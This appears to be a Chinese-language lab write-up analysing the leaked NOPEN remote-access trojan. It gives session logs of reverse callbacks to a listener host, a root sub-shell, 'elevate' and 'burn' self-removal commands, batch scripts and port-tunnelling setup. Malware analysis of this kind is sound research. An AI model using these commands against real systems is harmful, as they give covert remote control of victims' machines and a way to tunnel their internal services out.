  PID (PPID)         8072 (7980)
-listen 2007
[03-17-22 06:12:38 GMT][localhost:23223 -> centos4x86.local.172.19.2.11:32754]
[-listen 2007]
Starting listener on port 2007
noclient: waiting for response from server...
noclient: server successfully forked new process at PID 1509949440
./noclient-3.3.2.3-linux-i386 -l 9999
-call 172.19.2.13 9999
[03-17-22 06:28:22 GMT][localhost:23223 -> centos4x86.local.172.19.2.11:32754]
[-call 172.19.2.13 9999]
Initiating callback to 172.19.2.13:9999
noclient: waiting for response from server...
noclient: server successfully forked new process at PID 922746880
burn
执行退出后，如果只有一个服务端程序在运行，则删除服务端程序，进程退出。
远程服务端常用命令
主要是查看环境变量，进程列表，提权等。
elevate
应该是缺少关键程序。
ps
显示进程信息。
shell
-burn
[03-17-22 06:32:04 GMT][localhost:9999 -> centos4x86.local.172.19.2.11:32790]
[-burn]
To adjourn, type "BURN", otherwise return> BURN
-elevate
[03-19-22 02:14:43 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-elevate]
-ps -H
[03-19-22 02:16:01 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-ps -H]
UID     PID PPID PGID ST STIME         COMM             CMD
root      1    0    0 S  19Mar22 03:06 init             init [3]
root      2    1    0 S  19Mar22 03:06 ksoftirqd/0        -
root      3    1    0 S  19Mar22 03:06 events/0           -
root      4    1    0 S  19Mar22 03:06 khelper            -
root      5    1    0 S  19Mar22 03:06 kthread            -
root      6    5    0 S  19Mar22 03:06 kacpid               -
root     18    5    0 S  19Mar22 03:06 kblockd/0            -
root     36    5    0 S  19Mar22 03:06 pdflush              -
root     37    5    0 S  19Mar22 03:06 pdflush              -
root     39    5    0 S  19Mar22 03:06 aio/0                -
root    414    5    0 S  19Mar22 03:06 ata/0                -
-shell /bin/bash
[03-19-22 02:17:32 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-shell /bin/bash]
Starting NOPEN sub-shell (/bin/bash)
id&&pwd
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
context=root:system_r:unconfined_t
/root/bvp47
在noclient生成一个shell，后续的操作都在这个shell里面的进行。
time
nopen对时间非常敏感，里面有大量关于时间的函数，可能与环境检测有关，也与程序到期自动退出有
关。
status
显示连接状态。
getenv setenv
-time
[03-19-22 02:19:24 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-time]
Local time according to time():         Fri Mar 18 22:19:24 2022
Local time in GMT:                      Sat Mar 19 03:19:24 2022
Remote time according to time():        Sat Mar 19 02:19:26 2022
Remote time in GMT:                     Sat Mar 19 07:19:26 2022
UTC_OFFSET=240
UTC_OFFSET_SECS=14402s
UTC Offset (theirs - ours) is (+) 4h 0m 2s
-status
[03-19-22 02:21:08 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-status]
Connection
  Bytes In / Out     8328/12039 (69%C) / 2771/1562 (177%C)
  Local Host:Port    localhost:47388 (127.0.0.1:47388)
  CRemote Host:Port  172.19.2.11:32754 (172.19.2.11:32754)
  Remote Host:Port   centos4x86.local:32754 (172.19.2.11:32754)
Local
  NOPEN client       3.3.2.3
  Date/Time          Sat Mar 19 02:21:08 UTC 2022
  History            
/home/hacker/test/../down/history/centos4x86.local.172.19.2.11
  Command Out        
/home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-2022-03-19-
02:07:37
  CWD                /home/hacker/test
  NHOME              /home/hacker/test/..
  PID (PPID)         1019 (2817)
Remote
  NOPEN server       3.3.0.1 (version mismatch, 3.3.0.1 != 3.3.2.3)
  WDIR               /root/bvp47
  OS                 Linux 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686
  CWD                /root/bvp47
  PID (PPID)         7847 (7030)
和本地变量的使用差不多。
gs
批量执行脚本命令。
在NHOME/etc目录下编写脚本，然后通过gs来执行。
这个脚本只是显示用法，在Linux\etc\目录下有大量的脚本，值得学习。
这个脚本的执行效果如下。
-setenv TARGET=nsa.org
[03-19-22 02:22:43 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-setenv TARGET=nsa.org]
TARGET=nsa.org
-getenv
[03-19-22 02:23:16 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[-getenv]
TARGET=nsa.org
ping $TARGET
[03-19-22 02:24:52 GMT][localhost:47388 -> centos4x86.local.172.19.2.11:32754]
[ping $TARGET]
ping: unknown host nsa.org
 cat ~/NHOME/etc/gs.auto
#NOGS
-lcd /current/down -nohist
-lsh -nohist env | grep NOPEN ; echo;set | grep NOPEN
-gs auto
[04-01-22 06:45:23 GMT][localhost:53925 -> centos7x86.local.172.19.2.15:9999]
[-gs auto]
[04-01-22 06:45:23 GMT][localhost:53925 -> centos7x86.local.172.19.2.15:9999]
[-lcd /current/down]
/current/down
[04-01-22 06:45:23 GMT][localhost:53925 -> centos7x86.local.172.19.2.15:9999]
[-lsh env | grep NOPEN ; echo;set | grep NOPEN]
NOPEN_CLIENTVER=3.1.0.1
NOPEN_SERVERINFO=Linux 3.10.0-1160.2.2.el7.centos.plus.i686 #1 SMP Mon Oct 26 
11:56:29 UTC 2020 i686
NOPEN_RHOSTNAME=centos7x86.local.172.19.2.15
NOPEN_AUTOPORT=1025
NOPEN_MYPID=28709
NOPEN_MYLOG=/home/hacker/NHOME/down/cmdout/centos7x86.local.172.19.2.15-2022-04-
01-06:42:50
BASH_EXECUTION_STRING='env | grep NOPEN ; echo;set | grep NOPEN'
NOPEN_AUTOPORT=1025
NOPEN_CLIENTVER=3.1.0.1
NOPEN_MYLOG=/home/hacker/NHOME/down/cmdout/centos7x86.local.172.19.2.15-2022-04-
01-06:42:50
NOPEN_MYPID=28709
NOPEN_RHOSTNAME=centos7x86.local.172.19.2.15
NOPEN_SERVERINFO='Linux 3.10.0-1160.2.2.el7.centos.plus.i686 #1 SMP Mon Oct 26 
11:56:29 UTC 2020 i686'
可以看到NOPEN设置了大量环境变量，方便操作。
操作分析
为了进一步分析这个远控的功能，在泄露的文件中找到一组配对的文件，这样减少不必要的麻烦。文件
来自archive_files\morerats (2)\。
主要的目标是弄懂rat的操作手法，代码的实现逻辑。在操作方面，主要的问题是，服务端反向连接到客
户端，命令脚本的批量执行和隧道的综合利用。
服务端反向连接到客户端
noserver的启动参数，实现反向连接到noclient.
先启动客户端。
然后启动服务端。
这时就会反向连接到客户端。
sha1sum no*
df946eb8a908f663cd6cf68db7e5d377f1076ce8  noclient-3.1.0.2-
i686.pc.linux.gnu.redhat-ES
c3d2d2705db03434525727901cd177e64894bf50  noserver-3.1.0.1-
i686.pc.linux.gnu.redhat-ES
file no*
noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES: ELF 32-bit LSB executable, Intel 
80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 
2.2.5, stripped
noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES: ELF 32-bit LSB executable, Intel 
80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 
2.2.5, stripped
./noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES -l 9999
NOPEN!                             v3.1.0.1
sh: scanner: command not found
sh: ourtn: command not found
sh: scripme: command not found
Fri Apr 01 02:55:07 GMT 2022
NHOME: environment variable not set, assuming "NHOME=/home/hacker/test/.."
NHOME=/home/hacker/test/..
Reading resource file "/home/hacker/test/../etc/norc"... ok
TERM=screen
Entering server mode
Listening on *:9999... ok
D="-s -C172.19.2.15 9999" ./noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES
Accepted connection from 172.19.2.15:59938
Initiating RSA key exchange
这样反向连接建立，后续的操作与正向连接一样。
指定服务端口的正向连接
启动服务端
启动客户端
  Generating random number... ok
  Initializing RC6... ok
  Sending random number... ok
  Receiving random number... ok
  Generating session key... 0x379916E6C6A90737E869E1FC05B52CF4
  Sending first verify string... ok
  Receiving second verify string... ok
  Checking second verify string... ok
RSA key exchange complete
NOPEN server version... 3.1.0.1
Connection
  Bytes In / Out     226/119 (189%C) / 63/4 (1575%C)
  Local Host:Port    localhost:9999 (127.0.0.1:9999)
  Remote Host:Port   172.19.2.15:0 (172.19.2.15:0)
  Remote Host:Port   centos7x86.local:59938 (172.19.2.15:59938)
Local
  NOPEN client       3.1.0.1
  Date/Time          Fri Apr  1 02:56:16 UTC 2022
  History
  Command Out
  CWD                /home/hacker/test
  NHOME              /home/hacker/test/..
  PID (PPID)         977 (29861)
Remote
  NOPEN server       3.1.0.1
  WDIR               NOT SET
  OS                 Linux 3.10.0-1160.2.2.el7.centos.plus.i686 #1 SMP Mon Oct 
26 11:56:29 UTC 2020 i686
  CWD                /home/hacker/test
  PID (PPID)         1455 (11748)
Reading resource file "/home/hacker/test/../etc/norc.linux"... 
/home/hacker/test/../etc/norc.linux: No such file or directory
History loaded from 
"/home/hacker/test/../down/history/centos7x86.local.172.19.2.15"... ok
Creating command output file 
"/home/hacker/test/../down/cmdout/centos7x86.local.172.19.2.15-2022-04-01-
02:56:16"... ok
Lonely?  Bored?  Need advice?  Maybe "-help" will show you the way.
We are starting up our virtual autoport
We are bound and ready to go on port 1026
D="-s -l9999" ./noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES
./noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES 172.19.2.15 9999
即可进入操作。
命令脚本的批量执行
作为一个远控程序，批量执行命令，批量管理服务端，是一个基本需求。
启动两个服务端。
然后在客户端执行操作。
脚本的内容如下。
这样就实现了批量巡检的功能，当然此处应该有个脚本来自动管理这些服务端。
autopot
这个功能未知，但是有一个字符串 "Read failed ditching gui"，有可能存在一个图像控制端。
需要进一步分析。
incision
程序有字符串 "Entering INCISION mode"
但是木有弄清楚其使用方式，以及与dewdrop,tipoff的关联。
从代码看，就是劫持socket，然后进行操作，但是木有弄清楚具体的使用方式。
隧道的综合利用
隧道在内网渗透的重要性不言而喻，尽管前面在介绍隧道命令的时候，已经讲了如何使用隧道。
这里主要是根据常见使用场景，进行隧道搭建。
为了方便展示效果，这里仍然使用ncat进行演示。
因为noclient, noserver本书就可以生成shell。所以这里只介绍将内网端口映射到外网。
假定目标是把MySQL的端口映射出来，然后用客户端进行操作。
D="-s " ./noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES
D="-s -l9999" ./noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES
./noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES -c "-gs 
/home/hacker/NHOME/etc/gs.auto" 172.19.2.15:9999
./noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES -c "-gs 
/home/hacker/NHOME/etc/gs.auto" 172.19.2.14:32754